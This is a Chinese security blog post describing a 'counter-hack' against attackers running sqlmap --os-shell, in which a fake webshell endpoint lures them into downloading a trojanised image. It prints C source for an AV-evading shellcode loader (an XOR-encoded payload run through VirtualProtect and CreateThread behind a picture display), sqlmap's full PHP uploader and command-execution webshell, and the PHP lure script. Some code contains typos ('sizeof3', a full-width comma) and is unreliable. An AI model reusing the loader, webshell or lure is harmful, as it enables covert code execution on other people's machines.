# sqlmap --os-shell反制小思路

阅读量 **221195**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-14 10:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

之前有看到goby反制和松鼠A师傅[蚁剑反制](https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ)的文章，再想到之前写过sqlmap的shell免杀，觉得思路其实差不多，就写一篇sqlmap的反制吧。

## sqlmap流量分析

（其实可以通过分析解密后sqlmap内置的backdoor后门文件（[文章链接](https://www.freebuf.com/articles/web/291576.html)））

具体sqlmap的攻击流程差不多是这样：

>   1. 测试链接是否能够访问
>   2. 判断操作系统版本
>   3. 传递一个数组，尝试爆绝对路径
>   4. 指定上传路径
>   5. 使用lines terminated by 写入一个php文件，该php文件可以进行文件上传
>   6. 尝试找到上传的文件的访问路径；直到找到正确的路径
>   7. 通过上传的临时文件，尝试上传另外一个php文件， 该文件可以进行命令执行
>   8. 尝试进行命令执行 echo command execution test
>   9. 直接输入对应的命令
>   10. 退出 -–os-shell后删除命令马
>

然后我们反制思路其实大概分为两个

  * 一个是通过打开的页面嵌入js来直接执行命令
  * 另一个是通过打开钓鱼页面（比如flash钓鱼那种）

这两个相比而言其实各有优点，但我决定结合一下😯

**通过打开的页面来下载图片马，然后进行rce**

![](https://p2.ssl.qhimg.com/t016cacdd977a4b8c76.png)

## 制作

图片马里面的程序用C写的，用异或做了免杀（和其他师傅学习的）

这个是引用的头文件

    
    
    //{{NO_DEPENDENCIES}}
    //
    #define IDR_IMAGE1                      101
    #define IDI_ICON1                       102
    
    // Next default values for new objects
    // 
    #ifdef APSTUDIO_INVOKED
    #ifndef APSTUDIO_READONLY_SYMBOLS
    #define _APS_NEXT_RESOURCE_VALUE        103
    #define _APS_NEXT_COMMAND_VALUE         40001
    #define _APS_NEXT_CONTROL_VALUE         1001
    #define _APS_NEXT_SYMED_VALUE           101
    #endif
    #endif
    

这个才是C脚本

    
    
    #include<graphics.h>
    #include<conio.h>
    #include<iostream>
    #include "resource.h"
    using namespace std;
    
    void image() {
        IMAGE img;
        loadimage(&img, L"IMAGE", MAKEINTRESOURCE(IDR_IMAGE1));
        int w, h;
        w = img.getwidth();
        h = img.getheight();
        initgraph(w, h);
        putimage(0, 0, &img);
        getchar();
        closegraph();
    }
    
    int main()
    {
        unsigned char shellc0de[] = "\x1c\x65\x9d\x1c\xd5\xbd\x89\xab\xab\xab\x1c\xd9\x51\xbb\xab\xab\xab\x1c\xef\x4c\xc8\xae\xed\x37\x61\xee\x24\x1c\x65\x0c\x73\x1c\x79\xac\xab\xab\xab\xb6\xa0\xb0\x80\x2d\x09\xc7\x89\x2e\x24\x4c\xc8\xef\xbc\x76\x31\xbc\x75\x1a\x80\x9f\x3f\x52\x29\x65\x76\x2c\x80\x25\xbf\x2f\x29\x65\x76\x6c\x80\x25\x9f\x67\x29\xe1\x93\x06\x82\xe3\xdc\xfe\x29\xdf\xe4\xe0\xf4\xcf\x91\x35\x4d\xce\x65\x8d\x01\xa3\xac\x36\xa0\x0c\xc9\x1e\x89\xff\xa5\xbc\x33\xce\xaf\x0e\xf4\xe6\xec\xe7\xea\x6e\xac\x4c\xc8\xae\xa5\xb2\xa1\x9a\x43\x04\xc9\x7e\xbd\xbc\x29\xf6\x60\xc7\x88\x8e\xa4\x36\xb1\x0d\x72\x04\x37\x67\xac\xbc\x55\x66\x6c\x4d\x1e\xe3\xdc\xfe\x29\xdf\xe4\xe0\x89\x6f\x24\x3a\x20\xef\xe5\x74\x28\xdb\x1c\x7b\x62\xa2\x00\x44\x8d\x97\x3c\x42\xb9\xb6\x60\xc7\x88\x8a\xa4\x36\xb1\x88\x65\xc7\xc4\xe6\xa9\xbc\x21\xf2\x6d\x4d\x18\xef\x66\x33\xe9\xa6\x25\x9c\x89\xf6\xac\x6f\x3f\xb7\x7e\x0d\x90\xef\xb4\x76\x3b\xa6\xa7\xa0\xe8\xef\xbf\xc8\x81\xb6\x65\x15\x92\xe6\x66\x25\x88\xb9\xdb\xb3\x37\xf3\xa5\x8d\x60\xee\x24\x4c\xc8\xae\xed\x37\x29\x63\xa9\x4d\xc9\xae\xed\x76\xdb\xdf\xaf\x23\x4f\x51\x38\x8c\x81\xf3\x0e\x46\x89\x14\x4b\xa2\xdc\x73\xdb\x99\x80\x2d\x29\x1f\x5d\xe8\x58\x46\x48\x55\x0d\x42\x64\x55\x63\x5f\xba\xc1\x87\x37\x38\xaf\xad\x96\x37\x7b\x8e\x56\x0d\x8d\x0a\x29\xb0\xcb\xed\x37\x61\xee\x24";
        unsigned char key[] = "\x09\xab";
        unsigned char aa[] = "\x32\xff";
    
        DWORD dw_size = sizeof shellc0de;
        int i;
        for (i = 0; i < dw_size; i++) {
    
            shellc0de[i] ^= key[1];
            shellc0de[i] = aa[1] - shellc0de[i];
        }
        LPVOID men = CoTaskMemAlloc(sizeof shellc0de);
        DWORD lpflOldProtect = 0;
        UINT name = RegisterClipboardFormatW((LPCWSTR)shellc0de);
        VirtualProtect(men, sizeof3 shellc0de, 0x40, &lpflOldProtect);
        GetClipboardFormatNameW(name, (LPWSTR)men, sizeof shellc0de);
        HANDLE handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)men, 0, 0, 0);
        WaitForSingleObject(handle, -1);
        image();
        return 0;
    }
    

图片自己选一张然后生成马就行  
马弄得差不多了，接下来看看sqlmap的流量分析

## 分析&构造

众所周知，sqlmap会使用lines terminated by 写入一个php文件，可以进行文件上传。

    
    
    <?php
    // 判断是否有一个upload的值传过来
    if (isset($_REQUEST["upload"]))
    {
        // 将uploadDir赋值给绝对路径
        $dir = $_REQUEST["uploadDir"];
        // 判断php版本是否小于4.1.0
        if (phpversion() < '4.1.0')
        {
            $file = $HTTP_POST_FILES["file"]["name"];
            @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or die;
        }
        else
        {
            $file = $_FILES["file"]["name"];
            // 完成上传
            @move_uploaded_file($_FILES["file"]["tmp_name"], $dir . "/" . $file) or die;
        }
        // 设置权限
        @chmod($dir . "/" . $file, 0755);
        echo "File uploaded";
    }
    else
    {
        echo "<form action=" . $_SERVER["PHP_SELF"] . " method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=D:\\XXX\\XXXX> <input type=submit name=upload value=upload></form>";
    }
    

然后找绝对路径，上传下面这个真正的命令马。

    
    
    <?php
    $c=$_REQUEST["cmd"];
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set("max_execution_time",0);
    $z=@ini_get("disable_functions");
    if(!empty($z)) {
        $z=preg_replace("/[, ]+/",',',$z);
        $z=explode(',',$z);
        $z=array_map("trim",$z);
    } else {
        $z=array();
    }
    $c=$c." 2>&1\n";// 将命令与 2>&1进行拼接
    function f($n) {
        global $z;
        return is_callable($n)and!in_array($n,$z);//is_callable函数检查f($n)在当前环境中是否可调用
    }
    if(f("system")) {
        ob_start();
        system($c);
        $w=ob_get_clean();//返回输出缓冲区的内容,清空（擦除）缓冲区并关闭输出缓冲
    } elseif(f("proc_open")) {
        $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
        $w=NULL;
        while(!feof($t[1])) {//feof函数检查是否已到达文件末尾（EOF)
            $w.=fread($t[1],512);
        }
        @proc_close($y);
    } elseif(f("shell_exec")) {
        $w=shell_exec($c);
    } elseif(f("passthru")) {
        ob_start();
        passthru($c);
        $w=ob_get_clean();
    } elseif(f("popen")) {//popen()函数通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以 运行命令 来开启一个进程。这个进程必须由 pclose () 函数关闭
        $x=popen($c,r);
        $w=NULL;
        if(is_resource($x)) {
            while(!feof($x)) {
                $w.=fread($x,512);//fread() 函数读取文件（可安全用于二进制文件）。512:读取的最大字节数。
            }
        }
        @pclose($x);// pclose()函数关闭标准 I/O 流，等待命令执行结束，然后返回 shell 的终止状态。
    } elseif(f("exec")) {
        $w=array();
        exec($c,$w);
        $w=join(chr(10),$w).chr(10);
    } else {
        $w=0;
    }
    echo"<pre>$w</pre>";
    ?>
    

而最后的返回包，webshell获取了网站目录、数据库类型等信息。

这个时候，我们可以写一个伪造的sqlmap的”webshell“

    
    
    echo "SORRY"; preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A,$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//将命令执行函数替换掉
        $txt='D:/IIS5.0/WWW'."\t".'C:D:E:F:'."\t".'Windows NT LAPTOP-46FFII5G 6.2 build 9200 (Windows 8 Business Edition) i586'."\t";
        echo "$txt";//伪造连通
    

然后搭配上挂马图片的下载链接

    
    
    $iscmd="%(.*)127;%si";
    if (preg_match($iscmd,$A)!=0) {
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A，$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//将命令执行函数替换掉
        $payload='http://shell.com/index.html';
        echo 'WARN://'."\n".'数据上传成功，但与flash进行交互，请访问该网址进行shell链接。SQLMAP：'."$payload";
    

## 一代目

php写的不好，可能有点不符合sqlmap返回包的形式，以后我慢慢改吧

    
    
    <?php
    $A=urldecode(file_get_contents("php://input"));
    $iscmd="%(.*)127;%si";
    if (preg_match($iscmd,$A)!=0) {
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A，$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//将命令执行函数替换掉
        $payload='http://exp.com/index.html';
        echo 'WARN://'."\n".'数据上传成功，但与flash进行交互，请访问该网址进行shell链接。SQLMAP：'."$payload";//随便写，诱惑别人点进去。反正我是不信sqlmap会用flash
    } else {
        echo "SORRY";
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A,$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//将命令执行函数替换掉
        $txt='D:/IIS5.0/WWW'."\t".'C:D:E:F:'."\t".'Windows NT LAPTOP-46FFII5G 6.2 build 9200 (Windows 8 Business Edition) i586'."\t";
        echo "$txt";//伪造连通性
    }
    

## 反思

其实这个想法我感觉可能不太好，在连通性处写的可能有问题，我的wireshark有点问题，一直抓不了本地的流量包，只能看我终端返回的内容进行伪造了=_=

如果可以的话，师傅们可以抓本地流量包，然后自己改写伪造连通性的脚本。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **AndyNoel** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/261915](/post/id/261915)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [sqlmap](/tag/sqlmap)

 **+1** __5赞

 __收藏

![](https://p4.ssl.qhimg.com/t01684d4c9090d04d22.png) AndyNoel

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

